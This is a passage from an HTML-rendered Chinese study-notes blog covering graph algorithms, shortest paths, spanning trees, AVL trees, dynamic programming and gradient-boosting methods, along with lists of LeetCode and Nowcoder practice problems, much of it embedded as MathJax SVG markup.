476Z"></path></g><g data-mml-node="mo" transform="translate(4295.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4684.4, 0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mo" transform="translate(5448.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
<li>临界矩阵 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.273ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2772.9 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(828.3, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2383.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li>DFS (695)<ul>
<li>递归</li>
<li>栈-非递归</li>
<li>树的前序遍历</li>
</ul>
</li>
</ul>
</li>
<li>最短路径<ul>
<li>Dijkstra (743)<ul>
<li>1点到其它，每次确定一个结点</li>
<li>记录上一个结点可得到路径</li>
<li>权值非负</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.768ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 4759.3 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(828.3, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2606.1, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3606.3, 0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mo" transform="translate(4370.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 稀疏图</li>
</ul>
</li>
<li>Bellman-Ford<ul>
<li>权值可以为负（负环）</li>
<li>循环遍历所有边，直到所有值不改变（最多N-1）</li>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.955ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3074 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(1921, 0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mo" transform="translate(2685, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
</ul>
</li>
</ul>
</li>
<li>最小生成树 图的最小连通子图<ul>
<li>并查集 用集合中的一个元素代表集合（帮会）(684)</li>
<li>Kruskal (1135)<ul>
<li>对边排序，从小到大并查集</li>
</ul>
</li>
<li>Prim<ul>
<li>从某顶点开始，每次吸纳1个结点</li>
</ul>
</li>
</ul>
</li>
<li>二叉树的遍历（stack非递归较复杂）<ul>
<li>前序</li>
<li>中序</li>
<li>后序</li>
<li>层次（queue）</li>
</ul>
</li>
<li>二叉搜索树和平衡二叉树<ul>
<li>|左右子树高度之差|&lt;=1</li>
<li>搜索</li>
<li>插入<ul>
<li>平衡（只调整失衡的第一个结点）<ul>
<li>左-左<ul>
<li>右旋</li>
</ul>
</li>
<li>右-右</li>
<li>左-右<ul>
<li>左旋（产生左-左）-&gt;右旋</li>
</ul>
</li>
<li>右-左</li>
</ul>
</li>
</ul>
</li>
<li>删除<ul>
<li>结点不存在</li>
<li>叶子节点</li>
<li>有1个孩子</li>
<li>有2个孩子</li>
<li>平衡</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><h4 id="算法刷题重点题型-3"><a href="#算法刷题重点题型-3" class="headerlink" title="算法刷题重点题型"></a>算法刷题重点题型</h4><p>树类问题：</p>
<ul>
<li><p>[ ] 平衡二叉树（110）：<a href="https://leetcode-cn.com/problems/balanced-binary-tree">https://leetcode-cn.com/problems/balanced-binary-tree</a></p>
</li>
<li><p>[ ] 找树左下角的值（513）：<a href="https://leetcode-cn.com/problems/find-bottom-left-tree-value">https://leetcode-cn.com/problems/find-bottom-left-tree-value</a></p>
</li>
<li><p>[ ] 二叉树展开为链表（114）：<a href="https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list">https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list</a></p>
</li>
<li><p>[x] 二叉搜索树中第K小的元素（230）：<a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst">https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst</a></p>
</li>
<li><p>[ ] 实现 Trie (前缀树)（208）：<a href="https://leetcode-cn.com/problems/implement-trie-prefix-tree">https://leetcode-cn.com/problems/implement-trie-prefix-tree</a></p>
</li>
<li><p>[ ] 序列化二叉树：<a href="https://www.nowcoder.com/practice/cf7e25aa97c04cc1a68c8f040e71fb84">https://www.nowcoder.com/practice/cf7e25aa97c04cc1a68c8f040e71fb84</a></p>
</li>
<li><p>[ ] 重建二叉树：<a href="https://www.nowcoder.com/practice/8a19cbe657394eeaac2f6ea9b0f6fcf6">https://www.nowcoder.com/practice/8a19cbe657394eeaac2f6ea9b0f6fcf6</a></p>
</li>
</ul>
<p>图类问题：</p>
<ul>
<li><p>[ ] 判断二分图（785）：<a href="https://leetcode-cn.com/problems/is-graph-bipartite">https://leetcode-cn.com/problems/is-graph-bipartite</a></p>
</li>
<li><p>[ ] 拓扑排序（207）：<a href="https://leetcode-cn.com/problems/course-schedule">https://leetcode-cn.com/problems/course-schedule</a></p>
</li>
<li><p>[ ] 并查集（684）：<a href="https://leetcode-cn.com/problems/redundant-connection">https://leetcode-cn.com/problems/redundant-connection</a></p>
</li>
<li><p>[ ] 岛屿的最大面积（695）：<a href="https://leetcode-cn.com/problems/max-area-of-island/">https://leetcode-cn.com/problems/max-area-of-island/</a></p>
<ul>
<li>DFS或BFS</li>
</ul>
</li>
</ul>
<h4 id="算法刷题课后作业-3"><a href="#算法刷题课后作业-3" class="headerlink" title="算法刷题课后作业"></a>算法刷题课后作业</h4><ul>
<li><p>[ ] 对称的二叉树：<a href="https://www.nowcoder.com/practice/ﬀ05d44dfdb04e1d83bdbdab320efbcb">https://www.nowcoder.com/practice/ﬀ05d44dfdb04e1d83bdbdab320efbcb</a></p>
</li>
<li><p>[ ] 把二叉树打印成多行：<a href="https://www.nowcoder.com/practice/445c44d982d04483b04a54f298796288">https://www.nowcoder.com/practice/445c44d982d04483b04a54f298796288</a></p>
</li>
<li><p>[ ] 二叉树的下一个结点：<a href="https://www.nowcoder.com/practice/9023a0c988684a53960365b889ceaf5e">https://www.nowcoder.com/practice/9023a0c988684a53960365b889ceaf5e</a></p>
</li>
<li><p>[ ] 数据流中的中位数：<a href="https://www.nowcoder.com/practice/9be0172896bd43948f8a32fb954e1be1">https://www.nowcoder.com/practice/9be0172896bd43948f8a32fb954e1be1</a></p>
</li>
<li><p>[ ] 二叉搜索树的第k个结点：<a href="https://www.nowcoder.com/practice/ef068f602dde4d28aab2b210e859150a">https://www.nowcoder.com/practice/ef068f602dde4d28aab2b210e859150a</a></p>
</li>
<li><p>[ ] 按之字形顺序打印二叉树：<a href="https://www.nowcoder.com/practice/91b69814117f4e8097390d107d2efbe0">https://www.nowcoder.com/practice/91b69814117f4e8097390d107d2efbe0</a></p>
</li>
<li><p>[ ] 完全平方数（279）：<a href="https://leetcode-cn.com/problems/perfect-squares/">https://leetcode-cn.com/problems/perfect-squares/</a></p>
<ul>
<li>从n到0每个数字表示1个结点，相差1个完全平方数的结点有边，找0到n的最短路径</li>
</ul>
</li>
<li><p>[ ] 电话号码的字母组合（17）：<a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/">https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/</a></p>
</li>
</ul>
<h1 id="Week-5"><a href="#Week-5" class="headerlink" title="Week 5"></a>Week 5</h1><h2 id="机器学习-4"><a href="#机器学习-4" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>前向神经网络<ul>
<li>前向传播</li>
<li>反向传播</li>
</ul>
</li>
<li>序列数据中常用的循环神经网络<ul>
<li>RNN</li>
<li>GRU和LSTM</li>
</ul>
</li>
</ul>
<h2 id="算法-4"><a href="#算法-4" class="headerlink" title="算法"></a>算法</h2><ul>
<li>递归<ul>
<li>记忆化搜索</li>
<li>跳台阶 (509)</li>
<li>变态跳台阶 (牛客)</li>
</ul>
</li>
<li>回溯法（反向递归树）<ul>
<li>递归一定会发生回溯 暴力搜索</li>
<li>全排列 (46) 恢复标志位</li>
<li>机器人运动范围 (面试题13)</li>
</ul>
</li>
<li>动态规划DP<ul>
<li>保存子问题的答案</li>
<li>自下而上（与记忆化搜索相反）</li>
<li>0/1背包问题 (416. 分割等和子集)<ul>
<li>挑选的物品只有一个</li>
<li>该物品可选可不选<ul>
<li>状态</li>
</ul>
</li>
<li><code>dp[i][j]</code> 挑选第i个物品放入j容量的最大价值<ul>
<li>状态转移方程</li>
<li>空间：$O(n<em>C)<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="4.149ex" height="1.505ex" role="img" focusable="false" viewBox="0 -583 1833.8 665"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(1055.8, 0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g></g></g></svg></mjx-container>O(2</em>C)<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="21.067ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 9311.6 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">（</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">只</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">保</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">留</text><text data-variant="normal" transform="translate(3600, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">上</text><text data-variant="normal" transform="translate(4500, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">一</text><text data-variant="normal" transform="translate(5400, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">行</text><text data-variant="normal" transform="translate(6300, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">）</text></g><g data-mml-node="mo" transform="translate(7477.8, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(8533.6, 0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g></g></g></svg></mjx-container>O(C)$（倒序更新）</li>
<li>时间：$O(n<em>C)$ 物品数量</em>背包容量</li>
</ul>
</li>
</ul>
</li>
<li>最长上升子序列LIS (300)<ul>
<li><code>dp[i]</code> 以第i个数字结尾的LIS长度</li>
<li><code>dp[i] = max([dp[j] + 1 for j in range(i) if nums[i] &gt; nums[j]] + [1])</code></li>
</ul>
</li>
<li>最长公共子序列LCS (1143)<ul>
<li><code>dp[i][j]</code> s1的前i个字符和s2的前j的字符的LCS的大小</li>
<li><code>dp[i][j] = dp[i-1][j-1]+1 s1[i] == s2[j]</code></li>
<li><code>dp[i][j] = max(dp[i-1][j], dp[i][j-1]) s1[i] != s2[j]</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><h4 id="算法刷题重点题型-4"><a href="#算法刷题重点题型-4" class="headerlink" title="算法刷题重点题型"></a>算法刷题重点题型</h4><p>递归、回溯问题：</p>
<ul>
<li><p>[ ] 斐波那契数列：<a href="https://www.nowcoder.com/practice/c6c7742f5ba7442aada113136ddea0c3">https://www.nowcoder.com/practice/c6c7742f5ba7442aada113136ddea0c3</a></p>
</li>
<li><p>[ ] 跳台阶：<a href="https://www.nowcoder.com/practice/8c82a5b80378478f9484d87d1c5f12a4">https://www.nowcoder.com/practice/8c82a5b80378478f9484d87d1c5f12a4</a></p>
</li>
<li><p>[ ] 变态跳台阶：<a href="https://www.nowcoder.com/practice/22243d016f6b47f2a6928b4313c85387">https://www.nowcoder.com/practice/22243d016f6b47f2a6928b4313c85387</a></p>
</li>
<li><p>[x] 全排列（46）：<a href="https://leetcode-cn.com/problems/permutations/">https://leetcode-cn.com/problems/permutations/</a></p>
</li>
<li><p>[ ] 机器人的运动范围：<a href="https://www.nowcoder.com/practice/6e5207314b5241fb83f2329e89fdecc8">https://www.nowcoder.com/practice/6e5207314b5241fb83f2329e89fdecc8</a></p>
</li>
</ul>
<p>动态规划问题：</p>
<ul>
<li><p>[x] 斐波那契数列（用DP方法再写一下）（70）：<a href="https://leetcode-cn.com/problems/climbing-stairs">https://leetcode-cn.com/problems/climbing-stairs</a></p>
</li>
<li><p>[x] 0-1 背包（416）：<a href="https://leetcode-cn.com/problems/partition-equal-subset-sum">https://leetcode-cn.com/problems/partition-equal-subset-sum</a></p>
</li>
<li><p>[x] 最长递增子序列（300）：<a href="https://leetcode-cn.com/problems/longest-increasing-subsequence">https://leetcode-cn.com/problems/longest-increasing-subsequence</a></p>
</li>
<li><p>[x] 最长公共子序列（1143）：<a href="https://leetcode-cn.com/problems/longest-common-subsequence/">https://leetcode-cn.com/problems/longest-common-subsequence/</a></p>
</li>
</ul>
<h4 id="算法刷题课后作业-4"><a href="#算法刷题课后作业-4" class="headerlink" title="算法刷题课后作业"></a>算法刷题课后作业</h4><ul>
<li><p>[ ] 矩阵中的路径：<a href="https://www.nowcoder.com/practice/c61c6999eecb4b8f88a98f66b273a3cc">https://www.nowcoder.com/practice/c61c6999eecb4b8f88a98f66b273a3cc</a></p>
</li>
<li><p>[ ] 矩形覆盖：<a href="https://www.nowcoder.com/practice/72a5a919508a4251859fb2cfb987a0e6">https://www.nowcoder.com/practice/72a5a919508a4251859fb2cfb987a0e6</a></p>
</li>
<li><p>[ ] 矩阵路径（64）：<a href="https://leetcode-cn.com/problems/minimum-path-sum">https://leetcode-cn.com/problems/minimum-path-sum</a></p>
</li>
<li><p>[ ] 股票交易（309）：<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown</a></p>
</li>
<li><p>[ ] 字符串编辑（583）：<a href="https://leetcode-cn.com/problems/delete-operation-for-two-strings">https://leetcode-cn.com/problems/delete-operation-for-two-strings</a></p>
</li>
<li><p>[ ] 数组区间（303）：<a href="https://leetcode-cn.com/problems/range-sum-query-immutable">https://leetcode-cn.com/problems/range-sum-query-immutable</a></p>
</li>
<li><p>[ ] 分割整数（343）：<a href="https://leetcode-cn.com/problems/integer-break">https://leetcode-cn.com/problems/integer-break</a></p>
</li>
</ul>
<h1 id="Week-6"><a href="#Week-6" class="headerlink" title="Week 6"></a>Week 6</h1><h2 id="机器学习-5"><a href="#机器学习-5" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>集成学习<ul>
<li>Bagging<ul>
<li>随机森林</li>
</ul>
</li>
<li>Boosting<ul>
<li>梯度提升树 GBDT<ul>
<li>残差：真实值 - 预测值</li>
<li>基分类器：回归树CART</li>
<li>加法模型：决策树相加<ul>
<li>求解：前向分布算法</li>
</ul>
</li>
<li>用负梯度代替残差<ul>
<li>泰勒一阶展开</li>
</ul>
</li>
<li>问题（不同的损失函数）<ul>
<li>二分类<ul>
<li>对数损失函数</li>
<li>初始值求解</li>
<li>Newton-Raphson一步迭代<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="3.349ex" height="1.663ex" role="img" focusable="false" viewBox="0 -441 1480.2 735.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D6FE" d="M31 249Q11 249 11 258Q11 275 26 304T66 365T129 418T206 441Q233 441 239 440Q287 429 318 386T371 255Q385 195 385 170Q385 166 386 166L398 193Q418 244 443 300T486 391T508 430Q510 431 524 431H537Q543 425 543 422Q543 418 522 378T463 251T391 71Q385 55 378 6T357 -100Q341 -165 330 -190T303 -216Q286 -216 286 -188Q286 -138 340 32L346 51L347 69Q348 79 348 100Q348 257 291 317Q251 355 196 355Q148 355 108 329T51 260Q49 251 47 251Q45 249 31 249Z"></path></g><g data-mml-node="TeXAtom" transform="translate(518, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mi" transform="translate(412, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li>多分类<ul>
<li>交叉熵损失函数</li>
</ul>
</li>
<li>回归<ul>
<li>huber损失函数</li>
<li>平方损失函数</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>XGBoost<ul>
<li>预备知识<ul>
<li>泰勒二阶展开</li>
<li>结构风险极小化：正则化</li>
</ul>
</li>
<li>结构分</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
        <category>机器学习</category>
